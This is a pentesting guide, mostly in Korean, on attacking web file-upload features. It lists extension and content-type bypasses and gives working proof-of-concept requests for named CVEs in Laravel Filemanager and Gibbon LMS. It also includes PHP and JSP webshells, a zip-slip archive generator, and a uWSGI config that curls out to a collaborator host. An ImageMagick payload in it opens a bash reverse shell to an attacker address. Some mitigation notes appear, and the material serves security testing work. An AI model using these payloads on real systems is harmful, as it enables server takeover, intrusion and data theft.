# 파일 업로드

{{#include ../../banners/hacktricks-training.md}}

## 파일 업로드 일반 방법론

유용한 추가 확장자:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **PHPv8에서 작동**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### 파일 확장자 검사 우회

1. 가능하다면, **이전 확장자들을 확인**하세요. 또한 일부 **대문자**를 사용해 테스트해 보세요: _pHp, .pHP5, .PhAr ..._
2. _실행 확장자 앞에 **유효한 확장자 추가**를 시도해 보세요 (이전 확장자들도 사용):_
- _file.png.php_
- _file.png.Php5_
3. 끝에 **특수 문자를 추가**해 보세요. Burp를 사용해 모든 **ascii** 및 **Unicode** 문자를 **bruteforce**할 수 있습니다. (_참고: 이전에 언급한 **확장자들**을 사용해 볼 수도 있습니다_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. 서버 측의 확장자 파서를 **속여** 보호를 우회해 보세요. 예: **확장자 중복** 또는 확장자 사이에 **junk** 데이터나 **null** 바이트를 삽입하는 기법. _더 나은 페이로드를 위해 **이전 확장자들**을 사용해 볼 수도 있습니다._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 이전 기법에 **추가 확장자 레이어**를 더해 보세요:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. **실행 확장자(exec extension)를 정상 확장자 앞에 두는** 시도를 해 보세요. 서버가 잘못 구성된 경우에 유용합니다. (예: Apache의 잘못된 구성에서는 파일명이 반드시 .php로 끝나지 않아도 확장자에 **.php**가 포함되어 있으면 코드가 실행될 수 있습니다):
- _ex: file.php.png_
7. **Windows**의 **NTFS alternate data stream (ADS)**를 이용하는 방법. 이 경우 금지된 확장자 뒤와 허용된 확장자 앞에 콜론 ":" 문자가 삽입됩니다. 결과적으로 서버에 **금지된 확장자를 가진 빈 파일**이 생성될 수 있습니다 (예: "file.asax:.jpg"). 이 파일은 나중에 short filename 같은 다른 기법으로 수정될 수 있습니다. "**::$data**” 패턴을 사용해 비어있지 않은 파일을 만들 수도 있습니다. 따라서 이 패턴 뒤에 점(.)을 추가하면 추가 제한을 우회하는 데 유용할 수 있습니다 (예: "file.asp::$data.").
8. 파일명 길이 제한을 깨보세요. 유효한 확장자가 잘려나가고 악성 PHP가 남게 됩니다. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

일부 upload handler는 저장된 파일명에서 후행 점 문자를 잘라내거나 정규화합니다. UniSharp의 Laravel Filemanager (unisharp/laravel-filemanager) 버전 2.9.1 이전에서는 다음과 같이 extension 검증을 우회할 수 있습니다:

- 유효한 이미지 MIME과 magic header 사용 (예: PNG의 `\x89PNG\r\n\x1a\n`).
- 업로드 파일명을 PHP 확장자 뒤에 점을 붙여서 지정 (예: `shell.php.`).
- 서버가 후행 점을 제거하고 `shell.php`로 저장하며, 이 파일이 웹에서 서빙되는 디렉터리(기본 public storage 예: `/storage/files/`)에 놓이면 실행됩니다.

최소 PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
그런 다음 저장된 경로로 요청을 보내세요 (Laravel + LFM에서 일반적임):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- 서버 측에서 엄격한 allowlists를 적용하고 저장된 파일명을 재검증하세요.
- 업로드된 파일은 실행 불가능한 위치에서 제공하세요.

### Content-Type, Magic Number, Compression & Resizing 우회

- **Content-Type** 검사를 우회하려면 **Content-Type** **header**의 **value**를 다음으로 설정: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** 검사를 우회하려면 파일의 시작 부분에 **실제 이미지의 바이트**를 추가해 _file_ 명령을 혼동시키거나, 메타데이터 안에 셸을 삽입하세요:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
` \` 또는 페이로드를 이미지에 **직접 삽입**할 수도 있습니다:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- 만약 이미지에 **압축(compression)**이 적용된다면(예: [PHP-GD](https://www.php.net/manual/fr/book.image.php) 같은 표준 PHP 라이브러리 사용), 앞선 기법들은 효과가 없을 수 있습니다. 이 경우 **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 사용해 압축을 **견디는** 텍스트를 삽입할 수 있습니다.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- 웹 페이지가 PHP-GD의 `imagecopyresized` 또는 `imagecopyresampled` 같은 함수로 이미지를 **리사이징**할 수도 있습니다. 이 경우 **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 이용해 압축을 **견디는** 텍스트를 삽입할 수 있습니다.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- 또 다른 기법으로 PHP-GD의 `thumbnailImage` 함수를 사용하는 리사이징을 **견디는** 페이로드를 만드는 방법이 있습니다. 또는 **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 사용해 압축을 **견디는** 텍스트를 삽입할 수 있습니다.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- 이미 업로드된 파일의 확장자를 변경할 수 있는 취약점을 찾아보세요 (rename).
- 백도어를 실행하기 위한 **Local File Inclusion** 취약점을 찾아보세요.
- **가능한 정보 유출**:
1. 같은 이름의 파일을 **여러 번**(그리고 **동시에**) 업로드하세요.
2. 이미 존재하는 파일 또는 폴더의 **이름**으로 파일을 업로드하세요.
3. 파일 이름을 `"."`, `".."`, 또는 `"…"`로 업로드하세요. 예를 들어 Apache가 **Windows**에서 "/www/uploads/" 디렉토리에 업로드 파일을 저장할 때, `"."` 파일명은 "/www/" 디렉토리에 `uploads`라는 파일을 생성할 수 있습니다.
4. **NTFS**에서 **"…:.jpg"** 같은 삭제하기 어려운 파일명을 업로드하세요. (Windows)
5. Windows에서 `|<>*?”` 같은 **유효하지 않은 문자**를 포함하는 파일명을 업로드해 보세요. (Windows)
6. CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, LPT9 같은 **예약(금지된) 이름**을 사용해 파일을 업로드해 보세요. (Windows)
- 또한 피해자가 우연히 열었을 때 코드가 실행되는 실행 파일(.exe)이나 덜 의심스러운 .html 파일을 업로드해 보세요.

### Special extension tricks

파일을 **PHP server**에 업로드하려는 경우, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution)를 참조하세요.\
파일을 **ASP server**에 업로드하려는 경우, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files)를 참조하세요.

`.phar` 파일은 Java의 `.jar`와 유사하지만 PHP용이며, **php 파일처럼 사용될 수** 있습니다(php로 실행하거나 스크립트에 포함하여 사용).

`.inc` 확장자는 때때로 파일을 **import**하기 위해 사용되는 php 파일에 사용되므로, 어떤 경우에는 이 확장자가 **실행되도록 허용**되어 있을 수 있습니다.

## **Jetty RCE**

Jetty 서버에 XML 파일을 업로드할 수 있다면 [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.**를 통해 RCE를 얻을 수 있습니다. 아래 이미지에서 언급한 대로 XML 파일을 `$JETTY_BASE/webapps/`에 업로드하면 셸을 기대할 수 있습니다!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

이 취약점에 대한 자세한 내용은 원본 연구를 확인하세요: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

원격 명령 실행(RCE) 취약점은 `.ini` 구성 파일을 수정할 수 있는 경우 uWSGI 서버에서 악용될 수 있습니다. uWSGI 구성 파일은 "magic" 변수, 플레이스홀더 및 연산자를 포함하는 특정 문법을 사용합니다. 특히 `@(filename)`처럼 사용되는 '@' 연산자는 파일의 내용을 포함하도록 설계되어 있습니다. uWSGI에서 지원되는 여러 스킴 중 "exec" 스킴은 프로세스의 표준 출력으로부터 데이터를 읽을 수 있게 하며, `.ini` 구성 파일이 처리될 때 이를 Remote Command Execution 또는 Arbitrary File Write/Read 목적으로 악용할 수 있습니다.

다음은 다양한 스킴을 보여주는 악의적인 `uwsgi.ini` 파일의 예를 고려해보세요:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

구성 파일을 파싱하는 동안 payload가 실행됩니다. 구성이 활성화되어 파싱되려면 uWSGI 프로세스를 재시작해야 하며(충돌 후 또는 Denial of Service 공격으로 인해) 또는 파일이 auto-reload로 설정되어 있어야 합니다. auto-reload 기능이 활성화되어 있으면 변경을 감지했을 때 지정된 간격으로 파일을 다시 로드합니다.

It's crucial to understand the lax nature of uWSGI's configuration file parsing. Specifically, the discussed payload can be inserted into a binary file (such as an image or PDF), further broadening the scope of potential exploitation.

uWSGI의 구성 파일 파싱이 느슨하다는 점을 이해하는 것이 중요합니다. 특히 여기서 다룬 payload는 이미지나 PDF 같은 바이너리 파일 안에 삽입될 수 있어, 잠재적 악용 범위를 더욱 넓힙니다.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.

Gibbon LMS의 인증되지 않은 endpoint는 웹 루트 내에 arbitrary file write를 허용하며, PHP 파일을 업로드해 pre-auth RCE로 이어질 수 있습니다. 취약한 버전: 25.0.01까지(포함).

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- 필수 params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (서버는 type/name을 무시하며 꼬리 부분을 base64로 디코드합니다)
- `path`: Gibbon 설치 디렉터리 기준의 대상 파일명 (예: `poc.php` 또는 `0xdf.php`)
- `gibbonPersonID`: 비어있지 않은 아무 값이나 허용됩니다 (예: `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
최소한의 webshell을 업로드하고 명령을 실행:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
참고:
- 핸들러는 `;`와 `,`로 분할한 뒤 `base64_decode($_POST["img"])`를 수행하고, 확장자/타입을 검증하지 않은 채 바이트를 `$absolutePath . '/' . $_POST['path']`에 기록합니다.
- 결과적으로 실행되는 코드는 웹 서비스 사용자 권한으로 실행됩니다(예: XAMPP Apache on Windows).

References for this bug include the usd HeroLab advisory and the NVD entry. See the References section below.

## **wget File Upload/SSRF Trick**

어떤 경우에는 서버가 **`wget`**을 사용해 **파일을 다운로드**하고 **URL**을 **지정**할 수 있는 상황을 만날 수 있습니다. 이런 경우 코드가 다운로드되는 파일의 확장자가 화이트리스트에 있는지 검사해 허용된 파일만 다운로드되도록 할 수 있습니다. 그러나, **이 검사는 우회될 수 있습니다.**\
**linux**에서 **filename**의 **최대** 길이는 **255**이지만, **wget**은 파일명을 **236**자로 잘라냅니다. **"A"*232+".php"+".gif"**라는 파일을 **다운로드**하면 이 파일명은 검사를 **우회**합니다(이 예에서 **".gif"**는 **유효한** 확장자이기 때문). 하지만 `wget`은 파일명을 **"A"*232+".php"**로 **이름 변경**합니다.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **또 다른 옵션** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **작동하지 않습니다** **...하지 않는 한** wget is being used with the **parameter** `--trust-server-names` because **wget은 리디렉션된 페이지를 원래 URL에 표시된 파일 이름으로 다운로드하기 때문입니다**.

### NTFS junctions (Windows)를 통한 업로드 디렉토리 탈출

(이 공격은 Windows 머신에 대한 로컬 액세스가 필요합니다) 업로드가 Windows의 사용자별 하위 폴더(예: C:\Windows\Tasks\Uploads\<id>\)에 저장되고 해당 하위 폴더의 생성/삭제를 제어할 수 있다면, 이를 민감한 위치(예: webroot)를 가리키는 directory junction으로 교체할 수 있습니다. 이후 업로드되는 파일들은 대상 경로에 기록되며, 대상이 server‑side code를 해석할 경우 코드 실행이 가능해집니다.

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notes
- mklink /J creates an NTFS directory junction (reparse point). 웹 서버의 계정은 junction을 따라가서 대상에 대해 쓰기 권한을 가져야 합니다.
- This redirects arbitrary file writes; if the destination executes scripts (PHP/ASP), this becomes RCE.
- Defenses: don’t allow writable upload roots to be attacker‑controllable under C:\Windows\Tasks or similar; block junction creation; validate extensions server‑side; store uploads on a separate volume or with deny‑execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Some upload/ingest handlers write the raw request body to a filesystem path that is constructed from user-controlled query parameters. If the handler also supports Content-Encoding: gzip and fails to canonicalize/validate the destination path, you can combine directory traversal with a gzipped payload to write arbitrary bytes into a web-served directory and obtain RCE (e.g., drop a JSP under Tomcat’s webapps).

Generic exploitation flow:
- Prepare your server-side payload (e.g., minimal JSP webshell) and gzip-compress the bytes.
- Send a POST where a path parameter (e.g., token) contains traversal escaping the intended folder, and file indicates the filename to persist. Set Content-Type: application/octet-stream and Content-Encoding: gzip; the body is the compressed payload.
- Browse to the written file to trigger execution.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
그런 다음 트리거:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
노트
- Target paths vary by install (e.g., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). Any web-exposed folder that executes JSP will work.
- Burp Suite’s Hackvertor extension can produce a correct gzip body from your payload.
- This is a pure pre-auth arbitrary file write → RCE pattern; it does not rely on multipart parsing.

완화
- Derive upload destinations server-side; never trust path fragments from clients.
- Canonicalize and enforce that the resolved path stays within an allow-listed base directory.
- Store uploads on a non-executable volume and deny script execution from writable paths.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

Some legacy upload handlers that use `snprintf()` or similar to build multi-file arrays from a single-file upload can be tricked into forging the `_FILES` structure. Due to inconsistencies and truncation in `snprintf()` behavior, a carefully crafted single upload can appear as multiple indexed files on the server side, confusing logic that assumes a strict shape (e.g., treating it as a multi-file upload and taking unsafe branches). While niche today, this “index corruption” pattern occasionally resurfaces in CTFs and older codebases.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### 심볼릭 링크

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 다른 폴더에 압축 해제

압축 해제 중에 디렉터리에 파일이 예기치 않게 생성되는 것은 심각한 문제다. 처음에는 이 구성으로 인해 악성 파일 업로드를 통한 OS-level 명령 실행이 차단될 것이라고 생각될 수 있지만, ZIP archive format의 계층적 압축 지원 및 directory traversal 기능이 악용될 수 있다. 이를 통해 공격자는 대상 애플리케이션의 압축 해제 기능을 조작하여 제한을 우회하고 보안 업로드 디렉터리에서 탈출할 수 있다.

이런 파일을 제작하기 위한 자동화된 exploit는 [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc)에서 이용할 수 있다. 이 유틸리티는 다음과 같이 사용할 수 있다:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
추가로, **symlink trick with evilarc**도 하나의 옵션입니다. 목표가 `/flag.txt` 같은 파일을 겨냥하는 것이라면, 해당 파일에 대한 symlink를 시스템에 생성해야 합니다. 이렇게 하면 evilarc가 실행 중에 오류를 만나지 않습니다.

아래는 악성 zip 파일을 생성하는 데 사용되는 Python 코드의 예입니다:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

자세한 내용은 **원문 게시물 확인**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP 코드는 `$_REQUEST` 변수로 전달된 명령을 실행하도록 작성됩니다.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: 여러 파일을 생성하고 이러한 파일들을 포함하는 zip 아카이브를 만듭니다.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip 내부 파일 이름을 vi 또는 hex editor로 수정하여 "xxA"를 "../"로 바꿔 디렉터리 트래버셜을 수행합니다.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

이 콘텐츠를 이미지 확장자로 업로드하여 취약점 **(ImageMagick , 7.0.1-1)** 을 악용할 수 있습니다 (자세한 내용은 [exploit](https://www.exploit-db.com/exploits/39767) 참조)
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PHP Shell을 PNG에 임베딩

PNG 파일의 IDAT 청크에 PHP shell을 임베딩하면 특정 이미지 처리 작업을 우회할 수 있습니다. PHP-GD의 `imagecopyresized` 및 `imagecopyresampled` 함수는 각각 이미지 리사이징 및 리샘플링에 흔히 사용되므로 이 맥락에서 특히 관련이 있습니다. 임베디드된 PHP shell이 이러한 작업에 의해 영향을 받지 않고 유지될 수 있다는 점은 특정 사용 사례에서 큰 이점입니다.

이 기법의 방법론과 잠재적 응용을 자세히 다룬 글은 다음 기사에 수록되어 있습니다: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). 이 리소스는 프로세스와 그 함의를 포괄적으로 이해하는 데 도움이 됩니다.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

